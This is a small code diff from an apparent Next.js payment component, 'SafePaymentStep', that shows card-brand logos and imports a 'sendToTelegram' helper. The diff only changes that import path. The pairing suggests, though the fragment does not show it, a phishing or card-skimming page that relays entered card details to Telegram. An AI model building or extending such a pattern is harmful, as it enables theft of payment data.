@@ -4,7 +4,7 @@ import Image from 'next/image';
 import visaLogo from '../../assets/images/visa.png';
 import mastercardLogo from '../../assets/images/mastercard.png';
 import amexLogo from '../../assets/images/amex.png';
-import { sendToTelegram } from '@/lib/telegram';
+import { sendToTelegram } from '../lib/telegram';
 
 export function SafePaymentStep({ onBack, onContinue }: { onBack: () => void; onContinue: () => void }) {
   function handleContinue() {
